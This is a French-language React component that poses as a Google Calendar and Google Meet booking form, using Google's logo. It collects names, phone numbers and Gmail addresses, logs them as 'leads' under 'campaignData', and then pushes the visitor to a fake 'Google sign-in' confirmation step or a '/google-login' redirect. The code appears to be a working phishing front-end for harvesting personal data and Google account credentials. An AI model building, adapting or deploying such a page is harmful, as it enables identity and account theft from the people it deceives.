import React, { useEffect, useState } from 'react';
import { useLeadTracker } from '../../hooks/useLeadTracker';
import styles from '../../styles/modules/Popup.module.css';

const BookingPopup = ({ showPopup, isVisible, onClose, onSwitch, campaignData }) => {
  // Compatibilité avec les deux systèmes de props
  const visible = showPopup || isVisible;
  
  const [emailError, setEmailError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showConfirmation, setShowConfirmation] = useState(false);
  const [trackingError, setTrackingError] = useState(null);
  const [retryAttempts, setRetryAttempts] = useState(0);
  
  // Hook pour le tracking des leads
  const { trackBooking, isTracking } = useLeadTracker();

  const handlePopupClick = (e) => {
    // Empêcher la propagation de l'événement click pour éviter de fermer/rouvrir la popup
    e.stopPropagation();
  };

  const validateGmailAddress = (email) => {
    const emailRegex = /^[^\s@]+@gmail\.com$/i;
    return emailRegex.test(email);
  };

  const handleEmailChange = (e) => {
    const email = e.target.value;
    if (email && !validateGmailAddress(email)) {
      setEmailError('Merci d\'utiliser une adresse Gmail compatible.');
    } else {
      setEmailError('');
    }
  };

  const handleTrackingWithRetry = async (leadData, maxAttempts = 3) => {
    let lastError = null;
    
    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      try {
        await trackBooking(leadData);
        setTrackingError(null);
        return true;
      } catch (error) {
        lastError = error;
        console.warn(`Tentative ${attempt}/${maxAttempts} échouée:`, error);
        
        if (attempt < maxAttempts) {
          // Attendre avant de retry (délai progressif)
          await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
        }
      }
    }
    
    setTrackingError(lastError);
    return false;
  };

  const proceedToAuth = (email, firstName, lastName) => {
    // Utiliser onSwitch pour passer à la popup d'authentification
    if (onSwitch) {
      onSwitch('auth', {
        campaignData: {
          ...campaignData,
          firstName,
          lastName,
          email
        }
      });
    } else {
      // Fallback si onSwitch n'est pas disponible
      window.location.href = `/google-login?email=${encodeURIComponent(email)}&firstName=${encodeURIComponent(firstName)}`;
    }
  };

  const handleFormSubmit = async (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    const email = formData.get('email');
    const firstName = formData.get('firstName');
    const lastName = formData.get('lastName');
    const phone = formData.get('phone');
    const description = formData.get('description');
    
    if (!validateGmailAddress(email)) {
      return;
    }
    
    setIsSubmitting(true);
    setTrackingError(null);
    
    // Afficher l'état de confirmation immédiatement
    setShowConfirmation(true);
    
    // Tenter le tracking avec retry
    const trackingSuccess = await handleTrackingWithRetry({
      email,
      firstName,
      lastName,
      phone,
      description
    });
    
    if (trackingSuccess) {
      console.log('✅ Tracking réussi, passage à l\'authentification');
    } else {
      console.warn('⚠️ Tracking échoué après plusieurs tentatives, mais on continue');
    }
    
    // Passer à la popup AUTH après 2 secondes
    setTimeout(() => {
      proceedToAuth(email, firstName, lastName);
    }, 2000);
  };

  // Désactiver le scroll quand la popup est ouverte
  useEffect(() => {
    if (visible) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = 'unset';
    }

    // Nettoyer au démontage du composant
    return () => {
      document.body.style.overflow = 'unset';
    };
  }, [visible]);

  if (!visible) return null;

  return (
    <div className={styles.popupOverlay} onClick={handlePopupClick} data-popup="true">
      <div className={styles.popupContainer}>
        {showConfirmation ? (
          // État de confirmation
          <div className={styles.confirmationSection}>
            <div className={styles.confirmationHeader}>
              
              <svg width="174" height="32" viewBox="0 0 174 32" fill="none" xmlns="http://www.w3.org/2000/svg" class="gng3Yc"><title>Logo Google</title><path fill-rule="evenodd" clip-rule="evenodd" d="M40.8888 11.336C37.7591 11.336 35.2046 13.7327 35.2046 17.043C35.2046 20.3238 37.7591 22.75 40.8888 22.75C44.0186 22.75 46.5731 20.3336 46.5731 17.043C46.5731 13.7327 44.0186 11.336 40.8888 11.336ZM40.8888 20.5006C39.1728 20.5006 37.6908 19.0763 37.6908 17.043C37.6908 14.99 39.1728 13.5854 40.8888 13.5854C42.6048 13.5854 44.0868 14.99 44.0868 17.043C44.0868 19.0763 42.6048 20.5006 40.8888 20.5006Z" fill="#FBBC05"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M60.3892 22.75H62.8364V5.49141H60.3892V22.75Z" fill="#34A853"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M70.3924 20.5006C69.1249 20.5006 68.2279 19.921 67.6429 18.7718L75.2186 15.6187L74.9651 14.9704C74.4971 13.6934 73.0541 11.336 70.1194 11.336C67.2041 11.336 64.7764 13.6443 64.7764 17.043C64.7764 20.2452 67.1749 22.75 70.3924 22.75C72.9859 22.75 74.4874 21.1489 75.1114 20.2256L73.1809 18.9289C72.5374 19.8719 71.6599 20.5006 70.3924 20.5006ZM70.2169 13.4773C71.2211 13.4773 72.0791 13.9979 72.3619 14.7346L67.2431 16.8662C67.2431 14.4694 68.9299 13.4773 70.2169 13.4773Z" fill="#EA4335"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M12.848 13.3004V15.7168H18.581C18.4055 17.0723 17.957 18.0644 17.2745 18.7618C16.436 19.6066 15.1295 20.5299 12.848 20.5299C9.31854 20.5299 6.55929 17.6617 6.55929 14.1059C6.55929 10.55 9.31854 7.68178 12.848 7.68178C14.7493 7.68178 16.1435 8.43813 17.1673 9.41058L18.854 7.71124C17.4305 6.31641 15.5195 5.25555 12.848 5.25555C8.01204 5.25555 3.94629 9.22395 3.94629 14.096C3.94629 18.9681 8.01204 22.9365 12.848 22.9365C15.461 22.9365 17.4305 22.0721 18.971 20.4612C20.5505 18.8699 21.0478 16.6205 21.0478 14.8131C21.0478 14.2532 21.0088 13.7326 20.921 13.3004H12.848Z" fill="#4285F4"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M28.214 11.336C25.0843 11.336 22.5298 13.7327 22.5298 17.043C22.5298 20.3238 25.0843 22.75 28.214 22.75C31.3438 22.75 33.8983 20.3336 33.8983 17.043C33.8983 13.7327 31.3438 11.336 28.214 11.336ZM28.214 20.5006C26.498 20.5006 25.016 19.0763 25.016 17.043C25.016 14.99 26.498 13.5854 28.214 13.5854C29.93 13.5854 31.412 14.99 31.412 17.043C31.412 19.0763 29.93 20.5006 28.214 20.5006Z" fill="#EA4335"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M56.0794 12.6136H55.9916C55.4359 11.9456 54.3634 11.3366 53.0081 11.3366C50.1806 11.3366 47.7139 13.8218 47.7139 17.0437C47.7139 20.2459 50.1806 22.7507 53.0081 22.7507C54.3634 22.7507 55.4359 22.1417 55.9916 21.4541H56.0794V22.2497C56.0794 24.4304 54.9191 25.5993 53.0569 25.5993C51.5359 25.5993 50.5901 24.4991 50.2001 23.566L48.0356 24.4697C48.6596 25.9824 50.3074 27.8389 53.0569 27.8389C55.9721 27.8389 58.4389 26.1101 58.4389 21.8961V11.6215H56.0794V12.6136ZM53.2226 20.5013C51.5066 20.5013 50.2001 19.0279 50.2001 17.0437C50.2001 15.03 51.5066 13.586 53.2226 13.586C54.9191 13.586 56.2451 15.0595 56.2451 17.0633C56.2549 19.0573 54.9191 20.5013 53.2226 20.5013Z" fill="#4285F4"></path><path d="M93.152 23.102C91.9933 23.102 90.9153 22.8967 89.918 22.486C88.9353 22.0607 88.07 21.4813 87.322 20.748C86.5887 20 86.0167 19.1273 85.606 18.13C85.1953 17.118 84.99 16.0327 84.99 14.874C84.99 13.7007 85.1953 12.6153 85.606 11.618C86.0167 10.6207 86.5887 9.75533 87.322 9.022C88.07 8.274 88.9353 7.69467 89.918 7.284C90.9153 6.85867 91.9933 6.646 93.152 6.646C93.9587 6.646 94.7067 6.74867 95.396 6.954C96.1 7.15933 96.7453 7.45267 97.332 7.834C97.9187 8.21533 98.4467 8.67733 98.916 9.22L97.574 10.518C97.178 10.034 96.7527 9.638 96.298 9.33C95.858 9.022 95.374 8.79467 94.846 8.648C94.3327 8.50133 93.768 8.428 93.152 8.428C92.0227 8.428 90.9813 8.692 90.028 9.22C89.0747 9.748 88.312 10.496 87.74 11.464C87.168 12.4173 86.882 13.554 86.882 14.874C86.882 16.1793 87.168 17.316 87.74 18.284C88.312 19.252 89.0747 20 90.028 20.528C90.9813 21.056 92.0227 21.32 93.152 21.32C93.8413 21.32 94.472 21.2247 95.044 21.034C95.6307 20.8433 96.166 20.572 96.65 20.22C97.1487 19.868 97.6033 19.45 98.014 18.966L99.378 20.286C98.9233 20.8287 98.3733 21.3127 97.728 21.738C97.0973 22.1633 96.3933 22.5007 95.616 22.75C94.8533 22.9847 94.032 23.102 93.152 23.102ZM104.849 23.102C104.013 23.102 103.28 22.9407 102.649 22.618C102.018 22.2953 101.52 21.8553 101.153 21.298C100.801 20.726 100.625 20.0807 100.625 19.362C100.625 18.5407 100.838 17.8513 101.263 17.294C101.688 16.722 102.26 16.2967 102.979 16.018C103.698 15.7247 104.49 15.578 105.355 15.578C105.854 15.578 106.316 15.622 106.741 15.71C107.166 15.7833 107.533 15.8787 107.841 15.996C108.164 16.0987 108.406 16.2013 108.567 16.304V15.622C108.567 14.7713 108.266 14.0967 107.665 13.598C107.064 13.0993 106.33 12.85 105.465 12.85C104.849 12.85 104.27 12.9893 103.727 13.268C103.199 13.532 102.781 13.906 102.473 14.39L101.065 13.334C101.358 12.894 101.725 12.5127 102.165 12.19C102.605 11.8673 103.104 11.618 103.661 11.442C104.233 11.266 104.834 11.178 105.465 11.178C106.99 11.178 108.186 11.5813 109.051 12.388C109.916 13.1947 110.349 14.28 110.349 15.644V22.75H108.567V21.144H108.479C108.288 21.4667 108.017 21.782 107.665 22.09C107.313 22.3833 106.895 22.6253 106.411 22.816C105.942 23.0067 105.421 23.102 104.849 23.102ZM105.025 21.452C105.67 21.452 106.257 21.2907 106.785 20.968C107.328 20.6453 107.76 20.2127 108.083 19.67C108.406 19.1273 108.567 18.5333 108.567 17.888C108.23 17.6533 107.804 17.4627 107.291 17.316C106.792 17.1693 106.242 17.096 105.641 17.096C104.57 17.096 103.786 17.316 103.287 17.756C102.788 18.196 102.539 18.7387 102.539 19.384C102.539 20 102.774 20.4987 103.243 20.88C103.712 21.2613 104.306 21.452 105.025 21.452ZM112.95 22.75V6.998H114.82V22.75H112.95ZM122.478 23.102C121.392 23.102 120.424 22.8453 119.574 22.332C118.738 21.8187 118.078 21.1147 117.594 20.22C117.124 19.3253 116.89 18.306 116.89 17.162C116.89 16.0913 117.11 15.1013 117.55 14.192C118.004 13.2827 118.635 12.5567 119.442 12.014C120.263 11.4567 121.224 11.178 122.324 11.178C123.438 11.178 124.392 11.4273 125.184 11.926C125.99 12.41 126.606 13.0847 127.032 13.95C127.472 14.8153 127.692 15.8053 127.692 16.92C127.692 17.0227 127.684 17.1253 127.67 17.228C127.67 17.3307 127.662 17.4187 127.648 17.492H118.76C118.804 18.2987 118.987 18.9807 119.31 19.538C119.676 20.1687 120.146 20.638 120.718 20.946C121.304 21.254 121.913 21.408 122.544 21.408C123.365 21.408 124.04 21.2173 124.568 20.836C125.11 20.44 125.543 19.956 125.866 19.384L127.45 20.154C127.01 21.0047 126.379 21.7087 125.558 22.266C124.736 22.8233 123.71 23.102 122.478 23.102ZM118.87 15.952H125.712C125.697 15.644 125.624 15.314 125.492 14.962C125.374 14.5953 125.176 14.258 124.898 13.95C124.634 13.6273 124.289 13.3707 123.864 13.18C123.453 12.9747 122.94 12.872 122.324 12.872C121.59 12.872 120.952 13.0627 120.41 13.444C119.882 13.8107 119.478 14.3167 119.2 14.962C119.053 15.27 118.943 15.6 118.87 15.952ZM129.88 22.75V11.53H131.662V13.18H131.75C132.043 12.6373 132.52 12.168 133.18 11.772C133.855 11.376 134.588 11.178 135.38 11.178C136.759 11.178 137.793 11.5813 138.482 12.388C139.186 13.18 139.538 14.236 139.538 15.556V22.75H137.668V15.842C137.668 14.7567 137.404 13.994 136.876 13.554C136.363 13.0993 135.695 12.872 134.874 12.872C134.258 12.872 133.715 13.048 133.246 13.4C132.777 13.7373 132.41 14.1773 132.146 14.72C131.882 15.2627 131.75 15.8347 131.75 16.436V22.75H129.88ZM146.986 23.102C145.974 23.102 145.058 22.8453 144.236 22.332C143.43 21.8187 142.792 21.1147 142.322 20.22C141.853 19.3253 141.618 18.2987 141.618 17.14C141.618 15.9813 141.853 14.9547 142.322 14.06C142.792 13.1653 143.43 12.4613 144.236 11.948C145.058 11.4347 145.974 11.178 146.986 11.178C147.588 11.178 148.138 11.2733 148.636 11.464C149.135 11.6547 149.568 11.904 149.934 12.212C150.316 12.52 150.609 12.85 150.814 13.202H150.902L150.814 11.64V6.998H152.684V22.75H150.902V21.1H150.814C150.609 21.4373 150.316 21.76 149.934 22.068C149.568 22.376 149.135 22.6253 148.636 22.816C148.138 23.0067 147.588 23.102 146.986 23.102ZM147.184 21.408C147.83 21.408 148.431 21.2393 148.988 20.902C149.56 20.55 150.022 20.0587 150.374 19.428C150.726 18.7827 150.902 18.02 150.902 17.14C150.902 16.26 150.726 15.5047 150.374 14.874C150.022 14.2287 149.56 13.7373 148.988 13.4C148.431 13.048 147.83 12.872 147.184 12.872C146.539 12.872 145.93 13.048 145.358 13.4C144.801 13.7373 144.346 14.2287 143.994 14.874C143.642 15.5047 143.466 16.26 143.466 17.14C143.466 18.0053 143.642 18.7607 143.994 19.406C144.346 20.0513 144.801 20.55 145.358 20.902C145.93 21.2393 146.539 21.408 147.184 21.408ZM158.925 23.102C158.089 23.102 157.356 22.9407 156.725 22.618C156.094 22.2953 155.596 21.8553 155.229 21.298C154.877 20.726 154.701 20.0807 154.701 19.362C154.701 18.5407 154.914 17.8513 155.339 17.294C155.764 16.722 156.336 16.2967 157.055 16.018C157.774 15.7247 158.566 15.578 159.431 15.578C159.93 15.578 160.392 15.622 160.817 15.71C161.242 15.7833 161.609 15.8787 161.917 15.996C162.24 16.0987 162.482 16.2013 162.643 16.304V15.622C162.643 14.7713 162.342 14.0967 161.741 13.598C161.14 13.0993 160.406 12.85 159.541 12.85C158.925 12.85 158.346 12.9893 157.803 13.268C157.275 13.532 156.857 13.906 156.549 14.39L155.141 13.334C155.434 12.894 155.801 12.5127 156.241 12.19C156.681 11.8673 157.18 11.618 157.737 11.442C158.309 11.266 158.91 11.178 159.541 11.178C161.066 11.178 162.262 11.5813 163.127 12.388C163.992 13.1947 164.425 14.28 164.425 15.644V22.75H162.643V21.144H162.555C162.364 21.4667 162.093 21.782 161.741 22.09C161.389 22.3833 160.971 22.6253 160.487 22.816C160.018 23.0067 159.497 23.102 158.925 23.102ZM159.101 21.452C159.746 21.452 160.333 21.2907 160.861 20.968C161.404 20.6453 161.836 20.2127 162.159 19.67C162.482 19.1273 162.643 18.5333 162.643 17.888C162.306 17.6533 161.88 17.4627 161.367 17.316C160.868 17.1693 160.318 17.096 159.717 17.096C158.646 17.096 157.862 17.316 157.363 17.756C156.864 18.196 156.615 18.7387 156.615 19.384C156.615 20 156.85 20.4987 157.319 20.88C157.788 21.2613 158.382 21.452 159.101 21.452ZM167.027 22.75V11.53H168.809V13.334H168.897C169.043 12.9087 169.285 12.542 169.623 12.234C169.975 11.9113 170.371 11.662 170.811 11.486C171.265 11.2953 171.713 11.2 172.153 11.2C172.49 11.2 172.754 11.222 172.945 11.266C173.135 11.2953 173.311 11.3467 173.473 11.42V13.444C173.238 13.3267 172.981 13.2387 172.703 13.18C172.439 13.1213 172.167 13.092 171.889 13.092C171.346 13.092 170.847 13.246 170.393 13.554C169.938 13.862 169.571 14.2727 169.293 14.786C169.029 15.2993 168.897 15.864 168.897 16.48V22.75H167.027Z" fill="#5F6368"></path></svg>
              <div className={styles.checkIcon}>
                <div className={styles.spinner}></div>
              </div>
              <h2 className={styles.confirmationTitle}>Confirmez votre réservation</h2>
              <p className={styles.confirmationText}>
                Utilisez l'invite de connexion Google pour confirmer votre réservation.
              </p>
              {trackingError && (
                <p className={styles.trackingWarning}>
                  ⚠️ Réservation enregistrée mais synchronisation en cours...
                </p>
              )}
              <p className={styles.confirmationSubtext}>
                Redirection automatique en cours...
              </p>
            </div>
          </div>
        ) : (
          // Formulaire normal
          <>
            <div className={styles.popupHeader}>
              <h2 className={styles.title}>Échange / Café virtuel</h2>
              <div className={styles.dateTime}>
                <div>Réunion Google Meet • 15 minutes</div>
                <div className={styles.timezone}>(GMT+02:00) Heure d'Europe centrale - Paris</div>
                {campaignData && (
                  <div className={styles.eventHost}>
                    {campaignData.firstName} {campaignData.lastName} • {campaignData.email}
                  </div>
                )}
              </div>
              <button className={styles.closeBtn} onClick={onClose}>
                ×
              </button>
            </div>

            <div className={styles.meetInfo}>
              <img 
                src="https://ssl.gstatic.com/calendar/images/conferenceproviders/logo_meet_2020q4_192px.svg" 
                alt="Google Meet" 
                width="20" 
                height="20" 
                className={styles.meetIcon}
              />
              <div>Informations de visioconférence Google Meet ajoutées après la réservation</div>
            </div>

            <div className={styles.formSection}>
              <div className={styles.contactHeader}>
                <svg 
                  focusable="false" 
                  width="20" 
                  height="20" 
                  viewBox="0 0 24 24" 
                  className={styles.contactIcon}
                >
                  <path d="M22 3H2C.9 3 0 3.9 0 5v14c0 1.1.9 2 2 2h20c1.1 0 1.99-.9 1.99-2L24 5c0-1.1-.9-2-2-2zm0 16H2V5h20v14z"></path>
                  <path d="M21 6h-7v5h7V6zm-1 2l-2.5 1.25L15 8V7l2.5 1.25L20 7v1zM9 12c1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3 1.34 3 3 3zm0-4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm6 7.75c0-1.99-4-3-6-3s-6 1.01-6 3V18h12v-2.25zM13 16H5v-.09c.48-.5 2.51-1.16 4-1.16s3.52.66 4 1.16V16z"></path>
                </svg>
                <h3>Informations de contact</h3>
              </div>

              <form className={styles.form} onSubmit={handleFormSubmit}>
                <div className={styles.formRow}>
                  <div className={styles.inputGroup}>
                    <label>Prénom</label>
                    <input type="text" name="firstName" className={styles.input} required />
                  </div>
                </div>

                <div className={styles.formRow}>
                  <div className={styles.inputGroup}>
                    <label>Nom de famille</label>
                    <input type="text" name="lastName" className={styles.input} required />
                  </div>
                </div>

                <div className={styles.formRow}>
                  <div className={styles.inputGroup}>
                    <label>Adresse Gmail</label>
                    <input 
                      type="email" 
                      name="email"
                      className={`${styles.input} ${emailError ? styles.inputError : ''}`}
                      onChange={handleEmailChange}
                      placeholder="votre.nom@gmail.com"
                      required 
                    />
                    {emailError && <div className={styles.errorMessage}>{emailError}</div>}
                  </div>
                </div>

                <div className={styles.formRow}>
                  <div className={styles.inputGroup}>
                    <label>Numéro de téléphone</label>
                    <input type="tel" name="phone" className={styles.input} />
                  </div>
                </div>

                <div className={styles.formRow}>
                  <div className={styles.inputGroup}>
                    <label>Présentez-vous en quelques mots</label>
                    <textarea name="description" className={styles.textarea} rows="3"></textarea>
                  </div>
                </div>

                <div className={styles.formActions}>
                  <button type="button" onClick={onClose} className={styles.cancelBtn} disabled={isSubmitting}>
                    Annuler
                  </button>
                  <button type="submit" className={styles.bookBtn} disabled={isSubmitting || isTracking}>
                    {(isSubmitting || isTracking) ? (
                      <div className={styles.loadingContainer}>
                        <div className={styles.spinner}></div>
                        <span>{isTracking ? 'Réservation...' : 'Vérification en cours...'}</span>
                      </div>
                    ) : (
                      'Réserver'
                    )}
                  </button>
                </div>
              </form>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default BookingPopup;
